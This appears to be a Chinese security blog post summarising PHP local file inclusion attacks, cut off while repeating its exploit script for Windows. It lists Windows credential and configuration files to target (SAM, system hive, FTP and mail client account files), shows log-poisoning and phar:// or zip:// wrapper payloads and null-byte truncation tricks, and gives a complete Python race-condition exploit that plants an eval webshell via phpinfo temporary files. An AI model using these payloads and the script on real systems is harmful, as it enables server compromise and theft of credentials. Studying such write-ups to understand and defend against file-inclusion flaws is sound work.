+C:\Documents and Settings\Administrator\Application Data\360Safe\360Examine\360Examine.log
+c:\ravbin\store.ini
+c:\rising.ini
+C:\Program Files\Rising\Rav\RsTask.xml
+C:\Documents and Settings\All Users\Start Menu\desktop.ini
+C:\Documents and Settings\Administrator\My Documents\Default.rdp
+C:\Documents and Settings\Administrator\Cookies\index.dat
+C:\Documents and Settings\Administrator\My Documents\新建 文本文档.txt
+C:\Documents and Settings\Administrator\桌面\新建 文本文档.txt
+C:\Documents and Settings\Administrator\My Documents\1.txt
+C:\Documents and Settings\Administrator\桌面\1.txt
+C:\Documents and Settings\Administrator\My Documents\a.txt
+C:\Documents and Settings\Administrator\桌面\a.txt
+C:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpg
+E:\Inetpub\wwwroot\aspnet_client\system_web\1_1_4322\SmartNav.htm
+C:\Program Files\RhinoSoft.com\Serv-U\Version.txt
+C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini
+C:\Program Files\Symantec\SYMEVENT.INF
+C:\Program Files\Microsoft SQL Server\80\Tools\Binn\sqlmangr.exe
+C:\Program Files\Microsoft SQL Server\MSSQL\Data\master.mdf
+C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data\master.mdf
+C:\Program Files\Microsoft SQL Server\MSSQL.2\MSSQL\Data\master.mdf
+C:\Program Files\Microsoft SQL Server\80\Tools\HTML\database.htm
+C:\Program Files\Microsoft SQL Server\MSSQL\README.TXT
+C:\Program Files\Microsoft SQL Server\90\Tools\Bin\DdsShapes.dll
+C:\Program Files\Microsoft SQL Server\MSSQL\sqlsunin.ini
+C:\MySQL\MySQL Server 5.0\my.ini
+C:\Program Files\MySQL\MySQL Server 5.0\my.ini
+C:\Program Files\MySQL\MySQL Server 5.0\data\mysql\user.frm
+C:\Program Files\MySQL\MySQL Server 5.0\COPYING
+C:\Program Files\MySQL\MySQL Server 5.0\share\mysql_fix_privilege_tables.sql
+C:\Program Files\MySQL\MySQL Server 4.1\bin\mysql.exe
+c:\MySQL\MySQL Server 4.1\bin\mysql.exe
+c:\MySQL\MySQL Server 4.1\data\mysql\user.frm
+C:\Program Files\Oracle\oraconfig\Lpk.dll
+C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exe
+C:\WINDOWS\system32\inetsrv\w3wp.exe
+C:\WINDOWS\system32\inetsrv\inetinfo.exe
+C:\WINDOWS\system32\inetsrv\MetaBase.xml
+C:\WINDOWS\system32\inetsrv\iisadmpwd\achg.asp
+C:\WINDOWS\system32\config\default.LOG
+C:\WINDOWS\system32\config\sam
+C:\WINDOWS\system32\config\system
+c:\CMailServer\config.ini
+c:\program files\CMailServer\config.ini
+c:\tomcat6\tomcat6\bin\version.sh
+c:\tomcat6\bin\version.sh
+c:\tomcat\bin\version.sh
+c:\program files\tomcat6\bin\version.sh
+C:\Program Files\Apache Software Foundation\Tomcat 6.0\bin\version.sh
+c:\Program Files\Apache Software Foundation\Tomcat 6.0\logs\isapi_redirect.log
+c:\Apache2\Apache2\bin\Apache.exe
+c:\Apache2\bin\Apache.exe
+c:\Apache2\php\license.txt
+C:\Program Files\Apache Group\Apache2\bin\Apache.exe
+c:\Program Files\QQ2007\qq.exe
+c:\Program Files\Tencent\qq\User.db
+c:\Program Files\Tencent\qq\qq.exe
+c:\Program Files\Tencent\qq\bin\qq.exe
+c:\Program Files\Tencent\qq2009\qq.exe
+c:\Program Files\Tencent\qq2008\qq.exe
+c:\Program Files\Tencent\qq2010\bin\qq.exe
+c:\Program Files\Tencent\qq\Users\All Users\Registry.db
+C:\Program Files\Tencent\TM\TMDlls\QQZip.dll
+c:\Program Files\Tencent\Tm\Bin\Txplatform.exe
+c:\Program Files\Tencent\RTXServer\AppConfig.xml
+C:\Program Files\Foxmal\Foxmail.exe
+C:\Program Files\Foxmal\accounts.cfg
+C:\Program Files\tencent\Foxmal\Foxmail.exe
+C:\Program Files\tencent\Foxmal\accounts.cfg
+C:\Program Files\LeapFTP 3.0\LeapFTP.exe
+C:\Program Files\LeapFTP\LeapFTP.exe
+c:\Program Files\GlobalSCAPE\CuteFTP Pro\cftppro.exe
+c:\Program Files\GlobalSCAPE\CuteFTP Pro\notes.txt
+C:\Program Files\FlashFXP\FlashFXP.ini
+C:\Program Files\FlashFXP\flashfxp.exe
+c:\Program Files\Oracle\bin\regsvr32.exe
+c:\Program Files\腾讯游戏\QQGAME\readme.txt
+c:\Program Files\tencent\腾讯游戏\QQGAME\readme.txt
+c:\Program Files\tencent\QQGAME\readme.txt
+C:\Program Files\StormII\Storm.exe
+
+网站相对路径:
+
+/config.php
+../../config.php
+../config.php
+../../../config.php
+/config.inc.php
+./config.inc.php
+../../config.inc.php
+../config.inc.php
+../../../config.inc.php
+/conn.php
+./conn.php
+../../conn.php
+../conn.php
+../../../conn.php
+/conn.asp
+./conn.asp
+../../conn.asp
+../conn.asp
+../../../conn.asp
+/config.inc.php
+./config.inc.php
+../../config.inc.php
+../config.inc.php
+../../../config.inc.php
+/config/config.php
+../../config/config.php
+../config/config.php
+../../../config/config.php
+/config/config.inc.php
+./config/config.inc.php
+../../config/config.inc.php
+../config/config.inc.php
+../../../config/config.inc.php
+/config/conn.php
+./config/conn.php
+../../config/conn.php
+../config/conn.php
+../../../config/conn.php
+/config/conn.asp
+./config/conn.asp
+../../config/conn.asp
+../config/conn.asp
+../../../config/conn.asp
+/config/config.inc.php
+./config/config.inc.php
+../../config/config.inc.php
+../config/config.inc.php
+../../../config/config.inc.php
+/data/config.php
+../../data/config.php
+../data/config.php
+../../../data/config.php
+/data/config.inc.php
+./data/config.inc.php
+../../data/config.inc.php
+../data/config.inc.php
+../../../data/config.inc.php
+/data/conn.php
+./data/conn.php
+../../data/conn.php
+../data/conn.php
+../../../data/conn.php
+/data/conn.asp
+./data/conn.asp
+../../data/conn.asp
+../data/conn.asp
+../../../data/conn.asp
+/data/config.inc.php
+./data/config.inc.php
+../../data/config.inc.php
+../data/config.inc.php
+../../../data/config.inc.php
+/include/config.php
+../../include/config.php
+../include/config.php
+../../../include/config.php
+/include/config.inc.php
+./include/config.inc.php
+../../include/config.inc.php
+../include/config.inc.php
+../../../include/config.inc.php
+/include/conn.php
+./include/conn.php
+../../include/conn.php
+../include/conn.php
+../../../include/conn.php
+/include/conn.asp
+./include/conn.asp
+../../include/conn.asp
+../include/conn.asp
+../../../include/conn.asp
+/include/config.inc.php
+./include/config.inc.php
+../../include/config.inc.php
+../include/config.inc.php
+../../../include/config.inc.php
+/inc/config.php
+../../inc/config.php
+../inc/config.php
+../../../inc/config.php
+/inc/config.inc.php
+./inc/config.inc.php
+../../inc/config.inc.php
+../inc/config.inc.php
+../../../inc/config.inc.php
+/inc/conn.php
+./inc/conn.php
+../../inc/conn.php
+../inc/conn.php
+../../../inc/conn.php
+/inc/conn.asp
+./inc/conn.asp
+../../inc/conn.asp
+../inc/conn.asp
+../../../inc/conn.asp
+/inc/config.inc.php
+./inc/config.inc.php
+../../inc/config.inc.php
+../inc/config.inc.php
+../../../inc/config.inc.php
+/index.php
+./index.php
+../../index.php
+../index.php
+../../../index.php
+/index.asp
+./index.asp
+../../index.asp
+../index.asp
+../../../index.asp
+</code></pre>
+<p><strong>1.包含日志文件</strong></p>
+<p>通过burp访问:</p>
+<pre><code class="shell">1.http://127.0.0.1:8081/test.php?file=&lt;?php phpinfo();?&gt;
+
+2.http://127.0.0.1:8081/test.php?file=../../../../../../../var/log/apache2/access.log
+</code></pre>
+<p><strong>2.包含系统环境</strong></p>
+<p>linux(FreeBSD是没有这个的)下的/proc/self/environ 会获取用户的UA</p>
+<pre><code class="shell">VM-221-25-ubuntu:/var/log# ls -al /proc/self/environ
+-r-------- 1 root root 0 Jun 30 09:51 /proc/self/environ
+</code></pre>
+<p>这个其实有点意思,应该实战可能会出现的情景,个人认为应该是httpd或者php的权限太高导致的。</p>
+<p>Exploiting LFI to RCE /proc/self/environ with burpsuite:<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=dlh0ogYy9ys">https://www.youtube.com/watch?v=dlh0ogYy9ys</a></p>
+<h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>这个实战性还是很强的,所以这里我进行演示下,在默认phpstudy安装环境下如何实现getshell</p>
+<p>默认安装的时候是没有开启日志记录功能的也就是不存在 <code>access.log</code></p>
+<p>但是默认存在php error log</p>
+<p><code>C:\phpStudy\Apache\logs\error.log</code>是存在的</p>
+<p>不能在浏览器上直接访问,因为浏览器会自动urlencode编码特殊字符,所以利用的时候要用burp去操作</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125193307776.png" alt="image-20221125193307776"></p>
+<p><strong>1.访问不存在带有payload的文件</strong></p>
+<p>(我这里访问403后apache没有记录日志，晕)</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125195055671.png" alt="image-20221125195055671"></p>
+<p>然后查看下</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125195753881.png" alt="image-20221125195753881"></p>
+<p>发现成功写入</p>
+<pre><code class="php">http://127.0.0.1/index.php?file=C:\phpStudy\Apache\logs\error.log   //然后直接getshell
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125195838342.png" alt="image-20221125195838342"></p>
+<h3 id="存在上传图片等功能结合文件包含getshell"><a href="#存在上传图片等功能结合文件包含getshell" class="headerlink" title="存在上传图片等功能结合文件包含getshell"></a>存在上传图片等功能结合文件包含getshell</h3><p><strong>情况1 任意文件包含</strong></p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+$file = $_GET[&#39;file&#39;];
+include($file);
+?&gt;
+</code></pre>
+<p>还是这种情况(任意文件可控包含),这个时候如果可以上传文件比如图片之类的,直接包含起来就行了。</p>
+<p>比如我们上传一个HY.png</p>
+<p>内容:</p>
+<pre><code class="php">&lt;?php phpinfo();?&gt;
+</code></pre>
+<p>我们包含这个图片:</p>
+<pre><code class="php">http://193.43.142.8/sakura.php?file=HY.png
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125212231293.png" alt="image-20221125212231293"></p>
+<p><strong>情况2 限制后缀</strong></p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+$file = $_GET[&#39;file&#39;].&quot;.php&quot;; //限制只能包含php后缀的文件。
+include($file);
+?&gt;
+</code></pre>
+<p>因为上传点只允许上传<code>.jpg .png .gif</code>后缀的图片,比如我们上传了 <code>HY.jpg</code></p>
+<p>内容还是和上面一样，我们尝试包含一下</p>
+<p>此时就无法包含成功了</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125212513234.png" alt="image-20221125212513234"></p>
+<p>因为拼接之后就是: <code>HY.jpg.php</code>这个文件肯定不存在</p>
+<p>这个时候我们就可以利用伪协议来进行绕过。</p>
+<p>我们构造一个zip压缩包:</p>
+<p>就是写一个shell.php -&gt; zip压缩得到压缩包,然后改名为shell.png,去上传</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125213118153.png" alt="image-20221125213118153"></p>
+<p>然后修改后缀为shell.png,我们假设我们把这个图片上传到了服务器，我们来用一些协议去包含它</p>
+<ol>
+<li>利用**<code>zip://</code>协议**</li>
+</ol>
+<blockquote>
+<p>zip://与phar://的使用类似，但是需要绝对路径， zip文件后面要跟%23加zip文件里的文件</p>
+</blockquote>
+<p>windows可用</p>
+<p>可构造出路径:</p>
+<pre><code class="php">http://127.0.0.1/index.php?file=zip://E:/phpstudy_pro/WWW/shell.png%23shell
+</code></pre>
+<p>我用linux尝试了但是没有包含成功</p>
+<p>2.利用**<code>phar://</code>协议**</p>
+<p>windows和Linux都可用</p>
+<p>这个也可以用前面的那个压缩包,不过不需要#去分开压缩包里面的内容了,<code>phar://</code>协议是根据文件头去判断是不是压缩文件的,所以shell.png不会影响正常解析出这个压缩包。(这个在CTF比赛中很常见)</p>
+<pre><code class="php">http://127.0.0.1/index.php?file=phar://shell.png/shell
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125214942739.png" alt="image-20221125214942739"></p>
+<p>这个协议我在linux上也测试成功了，猜测是绝对路径出了问题</p>
+<pre><code class="php">http://193.43.142.8/sakura.php?file=phar://shell.png/shell
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125215039282.png" alt="image-20221125215039282"></p>
+<p><strong>3.利用截断绕过(老版本PHP)</strong></p>
+<p>这个以前还是很常见的,现在的话,利用很有限,这里就不去搭建环境测试了。<br> 引用l3mon师傅博客的写的总结。</p>
+<blockquote>
+<ol>
+<li>%00截断<br> /etc/passwd%00<br> (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li>
+<li>%00截断目录遍历：<br> /var/www/%00<br> (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li>
+<li>路径长度截断：<br> /etc/passwd/././././././.[…]/./././././.<br> (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li>
+<li>点号截断：<br> /boot.ini/………[…]…………<br> (php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li>
+</ol>
+</blockquote>
+<p>现在很少见版本这么低的了，就不复现辣</p>
+<h3 id="phpinfo-LFI-本地文件包含临时文件getshell"><a href="#phpinfo-LFI-本地文件包含临时文件getshell" class="headerlink" title="phpinfo-LFI 本地文件包含临时文件getshell"></a>phpinfo-LFI 本地文件包含临时文件getshell</h3><p>phpinfo(); 可以给我们提供什么信息?</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125215626807.png" alt="image-20221125215626807"></p>
+<p>开头的内容能给我门提供很多信息(我画的红框里面)</p>
+<p>常用:</p>
+<blockquote>
+<p>system info  详细的操作系统信息 确定window  or linux<br> Registered PHP Streams and filters  注册的php过滤器和流协议<br> extension_dir php扩展的路径<br> short_open_tag     &lt;?= 和 &lt;? echo 等价<br> disable_function 禁用函数<br> open_basedir 将用户可操作的文件限制在某目录下<br> SERVER_ADDR  真实ip<br> DOCUMENT_ROOT web根目录<br> _FILES[“file”] 可以获取临时文件名字和路径<br> session 可以查看session的相关配置</p>
+</blockquote>
+<p>原理非常简单:</p>
+<p>我们构造一个上传表单的时候,php也会生成一个对应的临时文件,这个文件的相关内容可以在phpinfo()的<code>_FILE[&quot;file&quot;]</code>查看到,但是临时文件很快就会被删除,所以我们赶在临时文件被删除之前,包含临时文件就可以getshell了。</p>
+<p>php处理流程timeline如下:</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125215748773.png" alt="image-20221125215748773"></p>
+<p><strong>1.我们来了解一下PHP临时文件的机制:</strong></p>
+<p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。</p>
+<p>$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。</p>
+<pre><code class="php">$_FILES[&#39;userfile&#39;][&#39;name&#39;] 客户端文件的原名称。
+$_FILES[&#39;userfile&#39;][&#39;type&#39;] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如&quot;image/gif&quot;。
+$_FILES[&#39;userfile&#39;][&#39;size&#39;] 已上传文件的大小，单位为字节。
+$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。
+$_FILES[&#39;userfile&#39;][&#39;error&#39;] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。
+</code></pre>
+<p>在临时文件包含漏洞中<code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p>
+<p><strong>2.存储目录</strong></p>
+<p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的<code>upload_tmp_dir</code>属性指定，假如<code>upload_tmp_dir</code>的路径不可写，PHP会上传到系统默认的临时目录中。</p>
+<p>不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。</p>
+<pre><code class="shell">Linux目录
+Linxu系统服务的临时文件主要存储在根目录的tmp文件夹下，具有一定的开放权限。
+/tmp/
+
+Windows目录
+Windows系统服务的临时文件主要存储在系统盘Windows文件夹下，具有一定的开放权限。
+C:/Windows/
+C:/Windows/Temp/
+</code></pre>
+<p><strong>3.命名规则</strong></p>
+<p>服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。</p>
+<p>可以通过phpinfo来查看临时文件的信息。</p>
+<p><strong>存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。</strong></p>
+<p>可以通过phpinfo来查看临时文件的信息。</p>
+<p><strong>(1)Linux Temporary File</strong></p>
+<p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221126162746868.png" alt="image-20221126162746868"></p>
+<p><strong>(2)Windows Temporary File</strong></p>
+<p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221126162905801.png" alt="image-20221126162905801"></p>
+<p>PHPINFO特性</p>
+<p><strong>通过上面的介绍，服务器上存储的临时文件名是随机的，这就很难获取其真实的文件名。不过，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</strong></p>
+<p>虽说这个漏洞出现的很早(2011年，国外的安全研究人员将这种攻击手法进行卡了公布)，不过这个技巧确实是个很经典的列子，不会被遗忘的。</p>
+<p><strong>4.漏洞分析</strong></p>
+<p>当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。<strong>文件名可以在<code>$_FILES</code>变量中找到</strong>。这个临时文件，在请求结束后就会被删除。</p>
+<p><strong>利用phpinfo的特性可以很好的帮助我们，因为phpinfo页面会将当前请求上下文中所有变量（所有数据）都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，拿到 临时文件变量名 之后，就可以进行包含执行我们传入的恶意代码。</strong></p>
+<p><strong>5.漏洞利用</strong></p>
+<p><strong>利用条件</strong>:几乎通杀</p>
+<p><strong>测试脚本</strong></p>
+<p>编写脚本，上传文件探测是否存在phpinfo包含临时文件的信息。</p>
+<pre><code class="php">import requests
+
+files = &#123;
+  &#39;file&#39;: (&quot;aa.txt&quot;,&quot;ssss&quot;)
+&#125;
+url = &quot;http://x.x.x.x/phpinfo.php&quot;
+r = requests.post(url=url, files=files, allow_redirects=False)
+print(r.text)
+</code></pre>
+<p>运行脚本向服务器发出请求可以看到回显中有如下内容</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221126162746868.png" alt="image-20221126162746868"></p>
+<p>windows同理</p>
+<p><strong>利用原理</strong>:</p>
+<p><strong>验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。</strong></p>
+<p><strong>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。</strong>但是在第一个请求结束，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
+<p><strong>利用过程</strong>:</p>
+<p>这个时候就需要用到条件竞争，具体原理和过程如下：</p>
+<p>（1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p>
+<p>（2）因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</p>
+<p>（3）php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p>
+<p>（4）所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p>
+<p>（5）此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p>
+<p>（6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p>
+<p><strong>Getshell脚本</strong>:</p>
+<p>利用p牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如<strong>上传的恶意文件内容</strong>、<strong>phpinfo.php</strong>和<strong>index.php</strong>相应文件的文件名和位置、<strong>系统临时文件写入目录</strong>等</p>
+<p><strong>Linux测试</strong></p>
+<p>exp.py</p>
+<pre><code class="python">#!/usr/bin/python
+# coding:utf-8
+
+import sys
+import threading
+import socket
+
+def setup(host, port):
+    TAG=&quot;Security Test&quot;
+    PAYLOAD=&quot;&quot;&quot;%s\r
+&lt;?php $c=fopen(&#39;/tmp/HY666.php&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php eval($_REQUEST[HY]);?&gt;&#39;);?&gt;\r&quot;&quot;&quot; % TAG
+    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD
+    padding=&quot;A&quot; * 5000
+    # 这里需要修改为phpinfo.php的地址
+    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r
+HTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)
+    #modify this to suit the LFI script
+    LFIREQ=&quot;&quot;&quot;GET /sakura.php?file=%s HTTP/1.1\r
+User-Agent: Mozilla/4.0\r
+Proxy-Connection: Keep-Alive\r
+Host: %s\r
+\r
+\r
+&quot;&quot;&quot;
+    return (REQ1, TAG, LFIREQ)
+
+def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    s.connect((host, port))
+    s2.connect((host, port))
+
+    s.send(phpinforeq)
+    d = &quot;&quot;
+    while len(d) &lt; offset:
+        d += s.recv(offset)
+    try:
+        i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)
+        fn = d[i+17:i+31]
+        print fn
+    except ValueError:
+        return None
+    s2.send(lfireq % (fn, host))
+    print lfireq % (fn, host) #debug调试结果
+    d = s2.recv(4096)
+    print d #查看回显是否成功
+    s.close()
+    s2.close()
+
+    if d.find(tag) != -1:
+        return fn
+
+counter=0
+class ThreadWorker(threading.Thread):
+    def __init__(self, e, l, m, *args):
+        threading.Thread.__init__(self)
+        self.event = e
+        self.lock =  l
+        self.maxattempts = m
+        self.args = args
+
+    def run(self):
+        global counter
+        while not self.event.is_set():
+            with self.lock:
+                if counter &gt;= self.maxattempts:
+                    return
+                counter+=1
+
+            try:
+                x = phpInfoLFI(*self.args)
+                if self.event.is_set():
+                    break
+                if x:
+                    print &quot;\nGot it! Shell created in /tmp/g&quot;
+                    self.event.set()
+
+            except socket.error:
+                return
+
+
+def getOffset(host, port, phpinforeq):
+    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    s.send(phpinforeq)
+
+    d = &quot;&quot;
+    while True:
+        i = s.recv(4096)
+        d+=i
+        if i == &quot;&quot;:
+            break
+        # detect the final chunk
+        if i.endswith(&quot;0\r\n\r\n&quot;):
+            break
+    s.close()
+    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)
+    if i == -1:
+        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)
+
+    print &quot;found %s at %i&quot; % (d[i:i+10],i)
+    # padded up a bit
+    return i+256
+
+def main():
+
+    print &quot;LFI With PHPInfo()&quot;
+    print &quot;-=&quot; * 30
+
+    if len(sys.argv) &lt; 2:
+        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]
+        sys.exit(1)
+
+    try:
+        host = socket.gethostbyname(sys.argv[1])
+    except socket.error, e:
+        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)
+        sys.exit(1)
+
+    port=80
+    try:
+        port = int(sys.argv[2])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)
+        sys.exit(1)
+
+    poolsz=10
+    try:
+        poolsz = int(sys.argv[3])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)
+        sys.exit(1)
+
+    print &quot;Getting initial offset...&quot;,
+    reqphp, tag, reqlfi = setup(host, port)
+    offset = getOffset(host, port, reqphp)
+    sys.stdout.flush()
+
+    maxattempts = 1000
+    e = threading.Event()
+    l = threading.Lock()
+
+    print &quot;Spawning worker pool (%d)...&quot; % poolsz
+    sys.stdout.flush()
+
+    tp = []
+    for i in range(0,poolsz):
+        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
+
+    for t in tp:
+        t.start()
+    try:
+        while not e.wait(1):
+            if e.is_set():
+                break
+            with l:
+                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))
+                sys.stdout.flush()
+                if counter &gt;= maxattempts:
+                    break
+        print
+        if e.is_set():
+            print &quot;Woot!  \m/&quot;
+        else:
+            print &quot;:(&quot;
+    except KeyboardInterrupt:
+        print &quot;\nTelling threads to shutdown...&quot;
+        e.set()
+
+    print &quot;Shuttin&#39; down...&quot;
+    for t in tp:
+        t.join()
+
+if __name__==&quot;__main__&quot;:
+    main()
+</code></pre>
+<p>可以用inotifywait命令来监控对tmp文件和目录的访问记录</p>
+<pre><code class="shell">apt install inotify-tools
+inotifywait -mrq -e &#39;create,delete,close_write,attrib,moved_to&#39; --timefmt &#39;%Y-%m-%d %H:%M&#39; --format &#39;%T %w%f %e&#39; /tmp/
+</code></pre>
+<p>然后修改脚本内容后运行:</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127012226499.png" alt="image-20221127012226499"></p>
+<p>但是我这里运行后并没有生成文件，郁闷，看监控，每次tmp文件也正常生成的</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127012329797.png" alt="image-20221127012329797"></p>
+<p>查看脚本debug，也是正常的</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127023204975.png" alt="image-20221127023204975"></p>
+<p>很奇怪，我自己尝试了下，发现/tmp/目录下的文件无法包含成功??(这里对111.php写入了phpinfo函数)</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127023414471.png" alt="image-20221127023414471"></p>
+<p>可能是我之前搞得一些东西，对目录做了限制，不过大体思路知道就没问题辣!</p>
+<p><strong>windows</strong></p>
+<p>同理，修改脚本文件生成路径即可</p>
+<pre><code class="php">#!/usr/bin/python
+# coding:utf-8
+
+import sys
+import threading
+import socket
+
+def setup(host, port):
+    TAG=&quot;Security Test&quot;
+    PAYLOAD=&quot;&quot;&quot;%s\r
